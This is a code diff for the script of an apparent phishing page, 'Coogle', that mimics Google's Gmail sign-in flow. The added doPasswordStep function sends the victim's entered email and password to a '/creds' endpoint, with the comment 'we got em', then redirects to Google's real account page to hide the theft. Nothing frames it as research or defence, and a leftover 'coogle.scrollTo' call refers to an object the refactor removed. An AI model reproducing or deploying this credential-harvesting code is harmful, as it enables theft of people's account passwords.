@@ -1,101 +1,99 @@
-
-    /* a regex express to valid email addresses */
-    /* ref. https://stackoverflow.com/questions/46155/how-to-validate-an-email-address-in-javascript */
-    function validateEmail(email) {
-        var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
-        return re.test(email);
-    }
-
+/* a regex express to valid email addresses */
+/* ref. https://stackoverflow.com/questions/46155/how-to-validate-an-email-address-in-javascript */
+function validateEmail(email) {
+	var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+	return re.test(email);
+}
 
 
-    function Coogle(){
-        var coogle = this;
 
 
-        coogle.onReady = function(){
-            coogle.scrollTo(400, 0)
-        }
+function onReady(){
+	scrollTo(400, 0)
+}
 
-        coogle.doEmailStep = function(){
+function doEmailStep(){
 
-            var emailValid = validateEmail($('#email-input').val());
-            
-            $('#cgle-progress-bar').fadeIn( 500 );//.css('display', 'block')
-            $('#login-form').css('opacity', 0.5)
+	var emailValid = validateEmail($('#email-input').val());
 
-            setTimeout(() => {
-                $('#cgle-progress-bar').fadeOut( 500 );//.css('display', 'none')
-                $('#login-form').css('opacity', 1.0)
-                if(emailValid){
-                    $('#email-input').removeClass('g-input-invalid')
-                    $('.invalid-email').css('display', 'none')
-                    $('#prev-email').text($('#email-input').val())
-                    coogle.toPasswordPage()
-                } else {
-                    $('#email-input').addClass('g-input-invalid')
-                    $('.invalid-email').css('display', 'block')
-                    coogle.toEmailPage()
-                }       
-            }, 400);
-        }
+	$('#cgle-progress-bar').fadeIn( 500 );//.css('display', 'block')
+	$('#login-form').css('opacity', 0.5)
 
-        coogle.doPasswordStep = function(){
-            var username = $('#email-input').val()
-            var password = $('#password-input').val()
-            console.log(username, password)
-        }
+	setTimeout(() => {
+		$('#cgle-progress-bar').fadeOut( 500 );//.css('display', 'none')
+		$('#login-form').css('opacity', 1.0)
+		if(emailValid){
+			$('#email-input').removeClass('g-input-invalid')
+			$('.invalid-email').css('display', 'none')
+			$('#prev-email').text($('#email-input').val())
+			toPasswordPage()
+		} else {
+			$('#email-input').addClass('g-input-invalid')
+			$('.invalid-email').css('display', 'block')
+			toEmailPage()
+		}
+	}, 400);
+}
 
-        coogle.toEmailPage = function(){
-            coogle.scrollTo(400)
-            $('#instruction-text').text('Sign in')
-            $('#instrution-text-desc').text('Continue to Gmail')
-            $('#email-input').focus()
-        }
+function doPasswordStep(){
+	var username = $('#email-input').val()
+	var password = $('#password-input').val()
 
-        coogle.toPasswordPage = function(){
-            coogle.scrollTo(0)
+	//Ladies and gentlemen, we got em
+	console.log(username, password)
+	var xmlHttp = new XMLHttpRequest();
+	xmlHttp.open("GET", "/creds?username="+ username +"&password="+ password, false);
+	xmlHttp.send(null);
 
-            $('#instruction-text').text('Welcome')
-            $('#instrution-text-desc').text(' ')
-            $('#password-input').focus()
-        }
+	//Redirect to myaccount.google
+	window.location.replace("https://myaccount.google.com")
+}
 
-        coogle.scrollTo = function(toPerc, duration = 500){
-            $('.slide-container-outer').animate({
-                scrollLeft: toPerc + '%'
-             }, duration);
-        }
+function toEmailPage(){
+	coogle.scrollTo(400)
+	$('#instruction-text').text('Sign in')
+	$('#instrution-text-desc').text('Continue to Gmail')
+	$('#email-input').focus()
+}
 
-        coogle.attachEvents = function(){
-            $('#email-form-step').on('submit', function( e ){
-                coogle.doEmailStep()
-                e.preventDefault()
-            })
+function toPasswordPage(){
+	scrollTo(0)
 
+	$('#instruction-text').text('Welcome')
+	$('#instrution-text-desc').text(' ')
+	$('#password-input').focus()
+}
 
-            $('.btn-next-email').on('click', function(){
-                coogle.doEmailStep()
-            })
-
-            $('#password-form-step').on('submit', function( e ){
-                coogle.doPasswordStep()
-                e.preventDefault()
-            })
-
-            $('.btn-next-password').on('click', function(){
-                coogle.doPasswordStep()
-            })
+function scrollTo(toPerc, duration = 500){
+	$('.slide-container-outer').animate({
+		scrollLeft: toPerc + '%'
+	 }, duration);
+}
 
 
-        }
+function attachEvents(){
+	$('#email-form-step').on('submit', function( e ){
+		doEmailStep()
+		e.preventDefault()
+	})
 
-        coogle.onReady()
-        coogle.attachEvents()
 
-    }
+	$('.btn-next-email').on('click', function(){
+		doEmailStep()
+	})
 
-    $( document ).ready(function() {
-        var myCoogle = new Coogle();
-        window.coogle = myCoogle;
-        //coogle.toPasswordPage()
-    });
+	$('#password-form-step').on('submit', function( e ){
+		doPasswordStep()
+		e.preventDefault()
+	})
+
+	$('.btn-next-password').on('click', function(){
+		doPasswordStep()
+	})
+
+}
+
+window.onload = function(){
+	onReady()
+	attachEvents()
+}
